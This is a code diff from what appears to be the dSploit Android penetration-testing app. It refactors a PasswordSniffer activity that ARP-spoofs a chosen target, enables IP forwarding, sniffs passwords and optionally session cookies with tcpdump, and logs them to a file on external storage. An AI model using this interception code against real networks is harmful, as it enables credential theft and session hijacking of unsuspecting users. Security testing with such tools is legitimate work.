@@ -29,9 +29,7 @@ import it.evilsocket.dsploit.R;
 import it.evilsocket.dsploit.core.System;
 import it.evilsocket.dsploit.gui.dialogs.FatalDialog;
 import it.evilsocket.dsploit.net.Stream;
-import it.evilsocket.dsploit.tools.Ettercap;
 import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;
-import it.evilsocket.dsploit.tools.TcpDump;
 import it.evilsocket.dsploit.tools.TcpDump.PasswordReceiver;
 import android.app.Activity;
 import android.content.Context;
@@ -43,6 +41,7 @@ import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.ViewGroup;
 import android.widget.BaseExpandableListAdapter;
+import android.widget.CheckBox;
 import android.widget.ExpandableListView;
 import android.widget.ProgressBar;
 import android.widget.TextView;
@@ -56,12 +55,11 @@ public class PasswordSniffer extends Activity
 	private static final String FILENAME    = "dsploit-password-sniff.log";
 	
 	private ToggleButton       mSniffToggleButton = null;
+	private CheckBox		   mSniffCookies	  = null;
 	private ProgressBar	       mSniffProgress     = null;
 	private ExpandableListView mListView		  = null;		
 	private ListViewAdapter	   mAdapter			  = null;
 	private boolean	           mRunning			  = false;	
-	private Ettercap           mEttercap		  = null;
-	private TcpDump	           mTcpDump			  = null;
 	private String			   mExternalStorage   = null;
 	private String			   mFileOutput		  = null;
 	private FileWriter		   mFileWriter		  = null;
@@ -187,14 +185,12 @@ public class PasswordSniffer extends Activity
         mExternalStorage   = Environment.getExternalStorageDirectory().toString();
         mFileOutput		   = ( new File( mExternalStorage, FILENAME ) ).getAbsolutePath();
         mSniffToggleButton = ( ToggleButton )findViewById( R.id.sniffToggleButton );
+        mSniffCookies	   = ( CheckBox )findViewById( R.id.cookieCheckBox );
         mSniffProgress	   = ( ProgressBar )findViewById( R.id.sniffActivity );
         mListView		   = ( ExpandableListView )findViewById( R.id.listView );
         mAdapter		   = new ListViewAdapter( this );
         
         mListView.setAdapter( mAdapter );
-
-        mEttercap = new Ettercap( this );
-        mTcpDump  = new TcpDump( this );
                 
         mSniffToggleButton.setOnClickListener( new OnClickListener(){
 			@Override
@@ -212,8 +208,8 @@ public class PasswordSniffer extends Activity
 	}
 
 	private void setStoppedState( ) {		
-		mEttercap.kill();
-		mTcpDump.kill();
+		System.getEttercap().kill();
+		System.getTcpDump().kill();
 
 		try
 		{
@@ -235,8 +231,8 @@ public class PasswordSniffer extends Activity
 
 	private void setStartedState( ) {		
 		// never say never :)
-		mEttercap.kill();
-		mTcpDump.kill();
+		System.getEttercap().kill();
+		System.getTcpDump().kill();
 		
 		try
 		{
@@ -250,23 +246,25 @@ public class PasswordSniffer extends Activity
 		}
 		
 		Toast.makeText( PasswordSniffer.this, "Logging to " + mFileOutput, Toast.LENGTH_LONG ).show();
-		
-		final Ettercap spoof = mEttercap;
-		final TcpDump  dump  = mTcpDump;
-		
-		spoof.spoof( System.getCurrentTarget(), new OnReadyListener(){
+				
+		System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
 			@Override
 			public void onReady() {
 				System.setForwarding( true );
 
-				dump.sniffPasswords( PCAP_FILTER, new PasswordReceiver(){
+				System.getTcpDump().sniffPasswords( PCAP_FILTER, new PasswordReceiver(){
 					@Override
 					public void onAccountFound( final Stream stream, final String data ) {
 						
 						PasswordSniffer.this.runOnUiThread( new Runnable() {
 							@Override
 							public void run()
-							{						
+							{	
+								boolean bSniffCookies = mSniffCookies.isChecked();
+								
+								if( bSniffCookies == false && data.startsWith("COOKIES") )
+									return;
+								
 								try
 								{
 									mBufferedWriter.write( stream.endpoint.toString() + " :\n" + data + "\n\n" );
